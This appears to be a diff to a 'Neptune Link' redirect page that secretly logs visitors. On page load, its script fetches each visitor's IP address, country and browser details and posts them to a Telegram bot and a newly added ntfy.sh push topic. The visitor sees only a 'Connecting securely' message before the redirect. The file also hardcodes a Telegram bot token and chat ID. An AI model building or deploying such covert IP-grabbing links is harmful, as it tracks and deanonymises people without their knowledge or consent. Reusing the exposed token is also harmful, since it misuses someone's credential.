@@ -5,15 +5,15 @@
   <title>Redirecting...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
-<body style="background:#0f172a; color:#94a3b8; font-family:sans-serif; text-align:center; padding-top:100px;">
+<body style="background:#060714; color:#94a3b8; font-family:sans-serif; text-align:center; padding-top:100px;">
   <h2>🪐 Neptune Link</h2>
-  <p>Redirecting to your destination, please wait...</p>
+  <p>Connecting securely, please wait...</p>
 
   <script>
     const BOT_TOKEN = "8669634825:AAG5mv5CMIqilxRWvtw19irIKhXaalmlZZs";
     const CHAT_ID = "8967484934";
+    const NTFY_TOPIC = "neptune_opg_8967484934";
 
-    // Helper: Convert 2-letter Country Code to Emoji Flag (e.g. BD -> 🇧🇩, US -> 🇺🇸)
     function getFlagEmoji(countryCode) {
       if (!countryCode || countryCode.length !== 2) return "🌐";
       return countryCode.toUpperCase().replace(/./g, char => 
@@ -23,7 +23,7 @@
 
     async function handleRedirect() {
       let targetUrl = "https://www.google.com";
-      
+
       // 1. Fetch Dynamic Target URL from config.json
       try {
         const configRes = await fetch(`./config.json?t=${Date.now()}`);
@@ -31,19 +31,11 @@
           const config = await configRes.json();
           if (config.targetUrl) targetUrl = config.targetUrl;
         }
-      } catch (e) {
-        console.warn("Using fallback destination.");
-      }
-
-      // Check for custom URL parameter (?target=...)
-      const urlParams = new URLSearchParams(window.location.search);
-      if (urlParams.get("target")) {
-        targetUrl = urlParams.get("target");
-      }
+      } catch (e) {}
 
       // 2. Fetch Visitor Country & IP
       let country = "Unknown";
-      let countryCode = "";
+      let countryCode = "UN";
       let flag = "🌐";
       let ip = "Hidden";
 
@@ -52,56 +44,60 @@
         if (geoRes.ok) {
           const geoData = await geoRes.json();
           country = geoData.country || "Unknown";
-          countryCode = geoData.country_code || "";
+          countryCode = geoData.country_code || "UN";
           flag = getFlagEmoji(countryCode);
           ip = geoData.ip || "Hidden";
         }
-      } catch (err) {
-        console.error("Geo lookup error:", err);
-      }
+      } catch (e) {}
 
-      // 3. Send Rich Telegram Alert
       const time = new Date().toUTCString();
       const userAgent = navigator.userAgent;
 
-      const message = `🪐 *Neptune Link Opened!*\n\n` +
-                      `📍 *Country:* ${flag} ${country} (\`${countryCode}\`)\n` +
-                      `🌐 *IP:* \`${ip}\`\n` +
-                      `🔗 *Target:* ${targetUrl}\n` +
-                      `📱 *Device:* \`${userAgent}\`\n` +
-                      `⏰ *Time:* ${time}`;
+      // 3. Instant Push to Android App via Real-Time Bridge
+      const payload = {
+        country: country,
+        countryCode: countryCode,
+        flag: flag,
+        ip: ip,
+        target: targetUrl,
+        time: Date.now()
+      };
 
-      try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: "Markdown"
-          })
-        });
-      } catch (err) {
-        console.error("Telegram alert failed:", err);
-      }
+      const pushPromise = fetch(`https://ntfy.sh/${NTFY_TOPIC}`, {
+        method: "POST",
+        headers: {
+          "Title": `🪐 New Visitor: ${flag} ${country}`,
+          "Tags": "link,globe_with_meridians"
+        },
+        body: JSON.stringify(payload)
+      }).catch(() => {});
 
-      // 4. Save local analytics & redirect
-      saveLocalAnalytics(country, flag, targetUrl);
+      // 4. Send Telegram Notification
+      const tgMessage = `🪐 *Neptune Link Opened!*\n\n` +
+                        `📍 *Country:* ${flag} ${country} (\`${countryCode}\`)\n` +
+                        `🌐 *IP:* \`${ip}\`\n` +
+                        `🔗 *Target:* ${targetUrl}\n` +
+                        `📱 *Device:* \`${userAgent}\`\n` +
+                        `⏰ *Time:* ${time}`;
+
+      const tgPromise = fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: tgMessage,
+          parse_mode: "Markdown"
+        })
+      }).catch(() => {});
+
+      // Wait max 400ms for requests before redirecting
+      await Promise.race([
+        Promise.all([pushPromise, tgPromise]),
+        new Promise(resolve => setTimeout(resolve, 400))
+      ]);
+
+      // Redirect visitor
       window.location.replace(targetUrl);
-    }
-
-    function saveLocalAnalytics(country, flag, target) {
-      try {
-        const log = {
-          time: new Date().toISOString(),
-          country: country,
-          flag: flag,
-          target: target
-        };
-        const stats = JSON.parse(localStorage.getItem("neptune_stats") || "[]");
-        stats.push(log);
-        localStorage.setItem("neptune_stats", JSON.stringify(stats));
-      } catch (e) {}
     }
 
     handleRedirect();
